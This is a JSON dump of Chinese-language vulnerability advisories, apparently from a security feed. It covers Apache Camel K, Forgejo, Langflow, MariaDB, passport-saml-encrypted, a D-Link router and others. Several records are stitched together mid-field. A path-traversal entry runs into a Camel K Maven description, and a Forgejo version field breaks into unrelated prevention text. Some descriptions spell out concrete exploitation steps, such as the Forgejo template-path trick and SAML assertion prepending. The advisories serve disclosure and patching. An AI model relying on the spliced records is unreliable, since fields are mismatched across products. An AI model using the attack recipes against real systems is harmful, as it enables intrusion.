"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "critical", "base_score": 9.3}]}, "cvss_score": 9.3, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-22", "description": "Pandora 是 pandora-analysis 团队开源（AGPL-3.0）的文件恶意软件分析框架，采用 worker 架构对用户提交的文件自动解包、转换并做静态检测，其中 extractor worker 负责将归档与磁盘镜像中的内容解压到任务目录。\n受影响版本中，extractor worker 把 ISO/CAB 等归档内部的文件名与解压目录直接拼接后写盘：_extract_iso 使用磁盘镜像目录记录中的 filename 构造 filepath，_extract_cab 使用 CAB 记录中的 filename 字段构造 file_path，两者写盘前未对最终路径做 resolve 与目录包含校验。拥有文件提交权限的用户上传携带越权路径的 ISO 或 CAB 文件，extractor worker 分析该文件时会把内容写到任务解压目录之外，覆盖 worker 进程可写的应用或系统文件，导致文件被篡改与拒绝服务，并可能借助被覆盖文件获得进一步入侵能力。\n修复版本中通过新增的 __safe_save 统一收口写盘动作：写入前对目标路径执行 resolve，并用 is_relative_to 校验其仍位于指定解压目录之下，越界时抛出新增的 PathTransversal 异常并拒绝写入，analyse 捕获该异常后将任务报告置为 ALERT 并记录路径穿越告警，从而切断越界写入链路。该修复当前位于仓库 develop 分支（commit d86ac5b260fb9a41e07f1da1bbd326cdcfc188a7），截至 2026-09-10 尚未包含在任何正式发布版本中。", "effects": [{"comp_name": "pandora", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,1.12.7]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "路径遍历", "kind_en": "对受限制目录的路径名的不 sitory 解析后写入 Maven 配置，pkg/util/maven 的 extraRepositories.apply 将该字符串同时写入 settings 的 repositories 与 pluginRepositories，并支持 @mirrorOf=、@checksumpolicy= 等指令，默认构建策略 routine 使 Maven 在 operator Pod 内执行，租户可控仓库因此影响 operator 内依赖与插件解析，租户最终能以 operator 权限执行任意代码。\n修复版本中通过新增 Maven 仓库白名单切断该链路：platform 包新增 IsMavenRepoAllowed，按 operator 环境变量 MAVEN_REPOSITORIES_ALLOWED（默认仅 Maven Central）对仓库全串精确匹配，builder trait 与 camel trait 在写入 Maven 配置前逐一校验，白名单外仓库直接使构建报错终止，阻止租户可控仓库到达 operator 内的 Maven 执行。", "effects": [{"comp_name": "camel_k", "ecosystem": "linux", "versions": [{"affected_version": "[2.10.0,2.10.2)", "min_fixed_version": "2.10.2", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[2.0.0,2.9.3)", "min_fixed_version": "2.9.3", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "eval注入", "kind_en": "动态评估代码中指令的不当中和（“评估注入”）", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-3bab-2fa2", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "http://www.mail-archive.com/announce@apache.org/msg11867.html", "name": ""}, {"url": "https://camel.apache.org/security/CVE-2026-80351.html", "name": ""}, {"url": "https://camel.apache.org/security/CVE-2026-80351.txt.asc", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-80351", "name": ""}, {"url": "https://github.com/apache/camel-k/pull/6786", "name": ""}, {"url": "https://github.com/apache/camel-k/commit/42b4573a779c4202a205a088e42c781cea3e4ed4", "name": ""}, {"url": "https://github.com/apache/camel-k/commit/954ff98054a28e3369712ecc8522811a70afa802", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "Apache Camel K 任意代码执行漏洞", "_translated": true, "_saved_at": "2026-09-10T07:46:33+00:00", "_first_saved_at": "2026-09-10T07:46:33+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-3bab-2fa2"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-3869", "cvss": {}, "cvss_score": 9.2, "cvss_vector": "", "cwe": "CWE-303", "description": "Modicon M580 是施耐德电气（Schneider Electric）推出的基于以太网的可编程自动化控制器（ePAC），Modicon M580 Safety 为其面向功能安全场景的型号，两者均为闭源商业固件产品，广泛用于制造业与关键基础设施的过程控制。\n受影响版本中，控制器认证算法实现存在缺陷（CWE-303），当 PLC 上运行的应用项目 application level 低于安全阈值（M580 低于 4.00、M580 Safety 低于 4.20）时，攻击者可从网络侧在无需任何凭据与用户交互的情况下与控制器建立未认证连接，进而读取或篡改控制逻辑、中断工业过程，导致 PLC 机密性、完整性与可用性全部受损。\n修复版本中通过固件升级与提升应用项目 application level 双重措施切断该利用链：Modicon M580 需固件 4.10 或以上并使用 EcoStruxure Control Expert V15.2 或更高版本将应用项目更新至 application level 4.00 或以上，Modicon M580 Safety 需固件 4.21 或以上并使用 EcoStruxure Control Expert V16.0 含 HF001 或更高版本更新至 application level 4.20 或以上，以消除未认证连接风险。", "effects": [{"comp_name": "modicon_m580_firmware", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,application level 4.00)", "min_fixed_version": "application level 4.00", "repository": "unmanaged", "solutions": [], "upstream": true}]}, {"comp_name": "modicon_m580_safety_firmware", "ecosystem": "linux", "versions": [{"affected_version": "(-∞,application level 4.20)", "min_fixed_version": "application level 4.20", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "认证算法的不正确实现", "kind_en": "Incorrect Implementation of Authentication Algorithm", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-a31c-d978", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.securityweek.com/ics-patch-tuesday-schneider-electric-siemens-fix-critical-flaws/", "name": ""}, {"url": "https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2026-251-04\u0026p_enDocType=Security+and+Safety+Notice\u0026p_File_Name=SEVD-2026-251-04.pdf", "name": ""}, {"url": "https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2026-251-04\u0026p_enDocType=Security+and+Safety+Notice\u0026p_File_Name=sevd-2026-251-04.json", "name": ""}, {"url": "https://www.se.com/ww/en/work/support/cybersecurity/security-notifications/", "name": ""}, {"url": "https://zibersegurtasun.euskadi.eus/albistea/2026/multiples-vulnerabilidades-productos-schneider-electric/cyb-aviso-sci-20260908/webcyb00-contcibglos/eu/", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "Modicon M580认证算法缺陷漏洞", "_translated": true, "_saved_at": "2026-09-10T07:46:30+00:00", "_first_saved_at": "2026-09-10T07:46:30+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-a31c-d978"}, {"analysis_status": 0, "articles": [{"content": "- 攻击者通过向受信任的数据序列化过程中添加恶意数据，从而在序列化和反序列化过程中执行恶意代码的攻击漏洞。这种漏洞通常存在于使用序列化 (serialization) 机制存储和传输数据的程序中。\n", "title": "什么是反序列化"}, {"content": "- 注入攻击：攻击者通过在序列化过程中注入恶意数据，将恶意代码注入到程序中，从而实现代码执行的目的。\n- 反射攻击：攻击者使用反射机制，在序列化过程中动态生成恶意数据，并将恶意代码注入到程序中，从而实现代码执行的目的。\n- 缓冲区溢出攻击：攻击者通过在序列化过程中向缓冲区输入恶意数据，导致缓冲区溢出，从而破坏程序的内存管理，实现代码执行的目的。\n- 格式字符串攻击：攻击者通过在序列化过程中输入恶意数据，导致程序使用错误的格式字符串，从而实现代码执行的目的。\n- 数据流攻击：攻击者通过在序列化过程中注入恶意数据，将恶意代码作为一个数据流传递给程序，从而实现代码执行的目的。\n", "title": "反序列化常见的攻击方式"}, {"content": "- 不信任输入数据：程序应该严格检查输入数据的有效性，并避免使用不受信任的数据。\n- 使用安全的序列化机制：程序应该使用安全的序列化机制，如 JSON 或 XML 序列化，而不是第三方序列化库。\n- 最小特权原则：程序应该限制对受信任数据的处理权限，并避免在运行时修改数据。\n- 代码审查和漏洞扫描：程序应该进行代码审查和漏洞扫描，以发现和修复潜在的安全漏洞。\n", "title": "如何预防反序列化"}], "cnvd_id": "", "cve_id": "CVE-2026-87930", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "high", "base_score": 8.1}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "critical", "base_score": 9.2}]}, "cvss_score": 9.2, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-502", "description": "MaxSite CMS 通过 109.6 将 ci_session cookie 传递给 unserialize()，而没有类限制，从而允许未经身份验证的攻击者注入 PHP 对象。攻击者可以使用硬编码加密密钥伪造有效的会话 cookie，以触发魔术方法并破坏应用程序状态或在小工具类存在的情况下实现代码执行。", "effects": [{"comp_name": "maxsite_cms", "ecosystem": "linux", "versions": [{"affected_version": "[0.78,109.6]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "反序列化", "kind_en": "不可信数据的反序列化", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-b6ul-ptjk", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-b6ul-ptjk", "name": "https://www.oscs1024.com/hd/MPS-b6ul-ptjk"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-87930", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-87930"}, {"url": "https://github.com/maxsite/cms", "name": ""}, {"url": "https://github.com/EviL0rd/maxsite-cve6/blob/main/2026.09.08-maxsite-cms-unsafe-unserialize-object-injection.md", "name": ""}, {"url": "https://github.com/maxsite/cms/blob/2ca0a0c7d1d71106a25dbb0f2aedaaefbf12802c/system/libraries/Session.php#L670-L680", "name": ""}, {"url": "https://github.com/maxsite/cms/blob/2ca0a0c7d1d71106a25dbb0f2aedaaefbf12802c/system/libraries/Session.php#L740-L742", "name": ""}, {"url": "https://github.com/EviL0rd/maxsite-cve4/blob/main/2026.09.08-maxsite-cms-hardcoded-session-key-auth-bypass.md", "name": ""}, {"url": "https://github.com/maxsite/cms/blob/2ca0a0c7d1d71106a25dbb0f2aedaaefbf12802c/application/config/config.php#L230-L254", "name": ""}, {"url": "https://www.vulncheck.com/advisories/maxsite-cms-through-109.6-php-object-injection-via-ci-session", "name": "VulnCheck Advisory: MaxSite CMS through 109.6 PHP Object Injection via ci_session"}], "scope_influence": "", "tags": ["应用软件"], "title": "MaxSite CMS 通过 ci_session 通过 109.6 PHP 对象注入", "_translated": true, "_saved_at": "2026-09-09T18:22:33+00:00", "_first_saved_at": "2026-09-09T18:22:33+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-b6ul-ptjk"}, {"analysis_status": 0, "articles": [{"content": "应用程序在处理用户输入时的不完善或缺乏验证机制，所以攻击者能够通过向应用程序发送恶意输入，利用应用程序对输入数据的错误处理方式来注入自己的恶意代码。这些恶意代码会被应用程序误认为是合法的指令或数据，并在执行过程中被执行。", "title": "什么是代码注入"}, {"content": "应用程序使用可执行动态代码的函数来执行用户可控的参数，当应用程序对于用户输入过滤不完全时，攻击者可以注入恶意代码并控制代码执行流程。", "title": "代码注入常见的攻击方式"}, {"content": "- 输入验证与过滤：应用程序应该对所有用户输入进行验证和过滤，确保只接受预期的有效输入。这包括对输入数据进行输入长度验证、类型检查和格式验证等。\r\n- 使用参数化查询或预编译语句：对于数据库查询操作，应该使用参数化查询或预编译语句，确保输入数据不会被误认为是执行代码。\r\n- 最小特权原则：应用程序在执行操作系统命令或动态代码时，应该使用最小特权原则，即使用具有最低权限的用户或服务来执行操作。\r\n- 安全编码实践：开发人员应该采用安全编码实践，包括避免使用eval函数、避免拼接用户输入的字符串作为代码执行等。\r\n- 使用Web应用程序防火墙（WAF）：部署Web应用程序防火墙可以帮助检测和阻止代码注入攻击。", "title": "如何预防代码注入"}], "cnvd_id": "", "cve_id": "CVE-2026-80352", "cvss": {}, "cvss_score": 9.2, "cvss_vector": "", "cwe": "CWE-94", "description": "Apache Camel K 是 Apache 软件基金会开源的 Kubernetes 云原生集成运行时，以 Operator 形式部署在集群中，负责管理 Integration 自定义资源并生成配套的 RBAC 资源。\n受影响版本中，Operator 处理 master trait 时将 Integration 自定义资源 spec.serviceAccountName 中的服务账号名未经格式校验直接填入 RoleBinding YAML 模板的 subjects.name 字段，持有 CR 编写权限的用户在该字段注入换行符等 YAML 语法字符后可追加任意 Kubernetes 对象文档，Operator 以自身权限应用渲染后的多文档 YAML，导致以其权限在集群中创建任意资源。\n修复版本中通过在 prepareRBAC 中增加 k8s.io/apimachinery 的 IsDNS1123Subdomain 校验，服务账号名不符合 DNS-1123 子域格式时直接返回错误，阻断非法字符进入 YAML 模板，消除以 Operator 权限创建任意对象的路径。", "effects": [{"comp_name": "camel_k", "ecosystem": "linux", "versions": [{"affected_version": "[2.0.0,2.9.3)", "min_fixed_version": "2.9.3", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[2.10.0,2.10.2)", "min_fixed_version": "2.10.2", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "代码注入", "kind_en": "代码生成控制不当（“代码注入”）", "last_modified_time": "2026-09-10", "level": "Critical", "mps_id": "MPS-e3eb-97e0", "poc": false, "poc_url": [], "published_time": "2026-09-10", "reference_url_list": [{"url": "http://www.mail-archive.com/announce@apache.org/msg11868.html", "name": ""}, {"url": "https://camel.apache.org/security/CVE-2026-80352.html", "name": ""}, {"url": "https://github.com/apache/camel-k/pull/6785", "name": ""}, {"url": "https://github.com/apache/camel-k/commit/021f4baa7678e6244077ae7fb0edb41a3543757c", "name": ""}, {"url": "https://github.com/apache/camel-k/commit/f0659822418eb3c0ab2b2090a797d7f0b8275763", "name": ""}, {"url": "https://www.cve.org/CVERecord?id=CVE-2026-80352", "name": ""}], "scope_influence": "", "tags": ["应用软件"], "title": "Apache Camel K YAML 注入漏洞", "_translated": true, "_saved_at": "2026-09-10T07:46:31+00:00", "_first_saved_at": "2026-09-10T07:46:31+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-e3eb-97e0"}, {"analysis_status": 0, "articles": [], "cnvd_id": "", "cve_id": "CVE-2026-89094", "cvss": {"cvssv31": [{"source": "cve@mitre.org", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", "severity": "critical", "base_score": 9.9}]}, "cvss_score": 9.9, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", "cwe": "CWE-1336", "description": "Forgejo 是由 Codeberg 社区基于 Gitea 分支开发的开源自托管代码协作平台，提供仓库托管、代码评审与 CI/CD 等功能，采用 Go 语言编写并以 MIT 许可证发布。\n受影响版本中，用户以模板仓库创建新仓库时，服务端克隆模板仓库、删除 .git 目录后读取 .forgejo/template 中列出的 glob 并对匹配文件执行变量模板扩展，文件路径本身同样参与扩展且扩展后未再次清理 .git 目录；攻击者在模板仓库中放置名为 .g${REPO_NAME}/config 的文件并在 .forgejo/template 中列出 .g*/config，将新仓库命名为 it 使该路径扩展为 .git/config，git init 初始化新仓库时沿用该目录中攻击者构造的 git 配置，随后的 git add、git commit、git push 以 Forgejo 进程权限执行，攻击者可借此在宿主机上执行任意进程并读取任意数据。\n修复版本中通过在模板变量扩展完成后、git 仓库初始化之前删除临时目录中已存在的 .git 目录，切断扩展产物进入 git 初始化的路径，使恶意模板仓库无法再植入 git 配置，消除任意进程执行与任意数据读取风险。", "effects": [{"comp_name": "forgejo.org", "ecosystem": "go", "versions": [{"affected_version": ，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查错误"}], "cnvd_id": "", "cve_id": "CVE-2026-85025", "cvss": {"cvssv31": [{"source": "psirt@us.ibm.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "critical", "base_score": 9.8}]}, "cvss_score": 9.8, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "cwe": "CWE-863", "description": "Langflow 是 IBM 开源的 LLM 应用可视化构建框架，用于编排大模型工作流与智能体，并支持把项目内的流程以 MCP（Model Context Protocol）服务端点的形式对外发布。\n受影响版本中，以公开（无需凭证）方式分享的项目 MCP 端点在处理工具调用时，api/v1/mcp_utils.py 的 handle_call_tool 直接执行数据库中存储的流程图，未运行公共流程必需的代码执行校验 validate_public_flow_no_code_execution 与可信组件源替换 prepare_public_flow_build，敏感字段值未清洗，匿名调用以解析出的项目所有者身份运行；调用方提交的 session_id 未经隔离直接用于聊天消息存取，未认证攻击者可借公开 MCP 项目端点触发任意代码执行，并访问或修改该流程下其他用户的聊天会话。\n修复版本中通过在公开 MCP 调用路径引入统一的匿名流程防护：先以 validate_public_flow_no_code_execution 拒绝携带代码执行组件的流程，再以 prepare_public_flow_build 替换为服务端可信组件源并以 strip_secret_field_values 清洗敏感字段，匿名调用改由 _public_mcp_execution_user 返回的固定匿名主体执行，session_id 经 _public_mcp_session_namespace 与 scope_session_to_namespace 限定到 MCP 连接与流程命名空间，从而阻断任意代码执行与会话越权访问。", "effects": [{"comp_name": "langflow", "ecosystem": "pip", "versions": [{"affected_version": "[1.0.0,1.11.6)", "min_fixed_version": "1.11.6", "repository": "pip", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "授权检查错误", "kind_en": "授权错误", "last_modified_time": "2026-09-11", "level": "Critical", "mps_id": "MPS-g4ac-b5ul", "poc": false, "poc_url": [], "published_time": "2026-09-11", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-g4ac-b5ul", "name": "https://www.oscs1024.com/hd/MPS-g4ac-b5ul"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85025", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-85025"}, {"url": "https://www.ibm.com/support/pages/node/7286666", "name": ""}], "scope_influence": "", "tags": ["AI", "python", "开源"] assport 认证策略（npm 包），用于解析可信 IdP 返回的 SAML 2.0 认证响应（含加密断言），在单点登录场景中完成签名校验与用户身份提取。\n受影响版本中，lib/saml.js 的 validateResponse 把签名校验与断言内容提取实现为两条互不关联的 XPath 查询：validateSignature 恒定选取文档中第一个 Signature 节点交给 xml-crypto 校验，断言内容另以 \"//*[local-name(.)='Assertion']\"[0] 选取文档中第一个 Assertion 节点，全程不解析签名 Reference URI，也不比对被签元素与参与身份提取的断言是否为同一节点。持有任一由可信 IdP 签名的有效 SAML 消息的攻击者，可在文档前部插入一条不带 ID 冲突的伪造未签名断言，真实签名仍对原断言校验通过，库却把伪造断言中的 NameID、role 等属性解析为已认证身份，实现任意身份冒充。\n修复版本中通过，可通过将身份提取严格限定在签名覆盖范围内缓解该问题：解析 Signature 的 Reference URI 定位被签元素，并与参与 profile 提取的 Assertion 做同一性比对，同时拒绝包含重复 ID 属性的文档；截至 2026-09-11，上游仓库与最新发布 v0.1.13 均未包含修复 commit，issue #30 仍处于 Open 状态。", "effects": [{"comp_name": "passport-saml-encrypted", "ecosystem": "npm", "versions": [{"affected_version": "(-∞,0.1.13]", "min_fixed_version": "", "repository": "npm", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "高", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "密码学签名的验证不恰当", "kind_en": "密码签名验证不当", "last_modified_time": "2026-09-11", "level": "Critical", "mps_id": "MPS-bfzp-kc0x", "poc": false, "poc_url": [], "published_time": "2026-09-11", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-bfzp-kc0x", "name": "https://www.oscs1024.com/hd/MPS-bfzp-kc0x"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-89043", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-89043"}, {"url": "https://github.com/krakenjs/passport-saml-encrypted/issues/30", "name": "Reporter advisory: XML signature wrapping"}, {"url": "https://github.com/krakenjs/passport-saml-encrypted/blob/v0.1.13/lib/saml.js#L256", "name": "Signature located by an unconstrained XPath at v0.1.13"}, {"url": "https://github.com/krakenjs/passport-saml-encrypted/blob/v0.1.13/lib/saml.js#L328", "name": "Assertion selected by a separate first-match XPath at v0.1.13"}, {"url": "https://github.com/krakenjs/passport-saml-encrypted", "name": "krakenjs/passport-saml-encrypted"}, {"url": "https://www.vulncheck.com/advisories/passport-saml-encrypted-through-0.1.13-xml-signature-wrapping-via-assertion-prepending", "name": "VulnCheck Advisory: passport-saml-encrypted through 0.1.13 XML Signature Wrapping via Assertion Prepending"}], "scope_influence": "", "tags": ["npm", "开源"], "title": "passport-saml-encrypted XML签名包装认证绕过", "_translated": true, "_saved_at": "2026-09-10T19:25:29+00:00", "_first_saved_at": "2026-09-10T19:25:29+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-bfzp-kc0x"}, {"analysis_status": 3, "articles": [], "cnvd_id": "", "cve_id": "", "cvss": {}, "cvss_score": 8.8, "cvss_vector": "", "cwe": "CWE-620", "description": "MariaDB Server 是开源关系型数据库，提供 SQL 账户管理与 GRANT PROXY 代理授权能力。\n受影响版本中，GRANT PROXY 在 grantee 上使用 IDENTIFIED VIA 空认证方法时，LEX_USER::has_auth() 只检查首个 USER_AUTH 节点的 plugin、auth_str、pwtext 是否非空，空首节点使 copy_and_check_auth() 跳过 check_alter_user()，而 replace_user_table() 仍会写入后续认证节点，导致仅有 USAGE 权限的用户可以修改已存在管理员账户的密码并接管其权限。\n修复版本中通过将 LEX_USER::has_auth() 改为只要存在 auth 指针即视为已指定认证，使空密码与空插件名仍触发授权检查，阻止低权限用户通过 GRANT PROXY 改写其他账户认证信息。", "effects": [{"comp_name": "mariadb", "ecosystem": "linux", "versions": [{"affected_version": "[10.6.1,10.6.28)", "min_fixed_version": "10.6.28", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[13.0.1,13.0.2)", "min_fixed_version": "13.0.2", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[10.11.1,10.11.19)", "min_fixed_version": "10.11.19", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[12.3.1,12.3.3)", "min_fixed_version": "12.3.3", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[11.4.1,11.4.13)", "min_fixed_version": "11.4.13", "repository": "unmanaged", "solutions": [], "upstream": true}, {"affected_version": "[11.8.1,11.8.9)", "min_fixed_version": "11.8.9", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": vd.nist.gov/vuln/detail/CVE-2026-86438", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86438"}, {"url": "https://github.com/laradashboard/laradashboard", "name": ""}, {"url": "https://github.com/laradashboard/laradashboard/blob/v1.3.1/app/Livewire/Marketplace/MarketplaceModuleBrowser.php#L76-L120", "name": ""}, {"url": "https://github.com/laradashboard/laradashboard/blob/v1.3.1/app/Policies/ModulePolicy.php#L32-L38", "name": ""}, {"url": "https://github.com/laradashboard/laradashboard/commit/738cc1a219ce459323ef1d09c3789075f1b8d2f2", "name": ""}, {"url": "https://github.com/laradashboard/laradashboard/releases/tag/v1.3.2", "name": ""}, {"url": "https://github.com/laradashboard/laradashboard/security/advisories/GHSA-4x9p-vg5m-vr6p", "name": ""}, {"url": "https://www.vulncheck.com/advisories/lara-dashboard-before-1.3.2-missing-authorization-in-marketplace-module-install-action", "name": ""}], "scope_influence": "", "tags": ["php", "开源"], "title": "Lara Dashboard授权绕过", "_translated": true, "_saved_at": "2026-09-07T23:23:25+00:00", "_first_saved_at": "2026-09-07T23:23:25+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-elg5-7f8u"}, {"analysis_status": 0, "articles": [{"content": "- 程序中的访问控制机制未正确实现，这种缺陷通常会导致未授权的用户或资源可以访问程序中的重要数据或资源，从而导致程序崩溃或出现其他错误。", "title": "什么是授权检查错误"}, {"content": "- 特权提升攻击：攻击者可以通过利用此缺陷，绕过应用程序的访问控制机制，获取系统管理员权限，从而完全控制系统。\n- 数据泄露攻击：攻击者可以通过利用此缺陷，获取系统中敏感数据，如用户凭证、信用卡信息等。\n- 拒绝服务攻击：攻击者可以通过利用此缺陷，对系统进行拒绝服务攻击，从而使系统无法正常工作。\n- 恶意软件传播：攻击者可以通过利用此缺陷，将恶意软件传播到系统中，从而控制系统或窃取敏感数据。\n", "title": "授权检查错误常见的攻击方式"}, {"content": "- 使用访问控制列表 (ACL):使用 ACL 可以限制用户对程序中的不同资源的访问权限。ACL 通常由用户名、权限和资源地址组成，可以确保只有授权用户才能访问程序中的重要数据或资源。\n- 使用访问令牌：使用访问令牌可以确保只有授权用户才能访问程序中的不同资源。令牌通常由用户 ID、权限和资源地址组成，可以确保只有授权用户才能更改令牌的权限。\n- 使用安全审计：在程序中记录安全审计日志，可以确保管理员可以追踪未授权用户的活动。同时，定期审查安全审计日志，可以及时发现未授权的活动并采取相应的措施。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\ /UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-121", "description": "D-Link DIR-895L 是友讯面向家庭与小型办公场景的商业无线路由器，固件以闭源产品形态发布，部分组件通过 GPL 源码包提供；内置 udhcpcd 负责向局域网客户端分配 DHCP 地址。\n受影响版本中，udhcpcd 在 serverpacket.c 的 sendOffer 与 sendACK 路径调用 valid_tr111_cpe_parse() 解析 DHCP 厂商自定义选项 125（TR-111）。该函数对长度前缀的子选项数据直接执行 strcpy()，写入 sendOffer/sendACK 内 256 字节栈缓冲 devOUI、devSN 与 devPC。DHCP 子选项并非保证以 NUL 结尾的 C 字符串，strcpy() 会越过声明长度继续复制，造成栈缓冲区溢出。接入局域网的未认证攻击者发送包含恶意选项 125 的 DHCPDISCOVER 或 DHCPREQUEST 可以触发内存破坏，导致 DHCP 服务崩溃或潜在代码执行。\n修复版本中通过按子选项声明长度执行有界拷贝并显式写入 NUL 终止符，替代对 DHCP 选项内容调用 strcpy()，阻止超长或未终止数据覆盖栈缓冲。公开资料未给出已发布的官方修复固件，DIR-895L 已结束厂商支持周期。", "effects": [{"comp_name": "dir-895l", "ecosystem": "linux", "versions": [{"affected_version": "[A1_102b07,A1_102b07]", "min_fixed_version": "", "repository": "unmanaged", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "栈缓冲区溢出", "kind_en": "基于堆栈的缓冲区溢出", "last_modified_time": "2026-09-08", "level": "High", "mps_id": "MPS-xy0d-76ht", "poc": false, "poc_url": [], "published_time": "2026-09-08", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-xy0d-76ht", "name": "https://www.oscs1024.com/hd/MPS-xy0d-76ht"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86509", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-86509"}, {"url": "https://tzh00203.notion.site/D-Link-DIR-895L-Stack-Overflow-in-udhcpd-TR-111-Option-125-Parsing-33cb5c52018a80dc8140e1502e4814d0", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-86509", "name": ""}, {"url": "https://vuldb.com/submit/906298", "name": ""}, {"url": "https://vuldb.com/vuln/399662", "name": 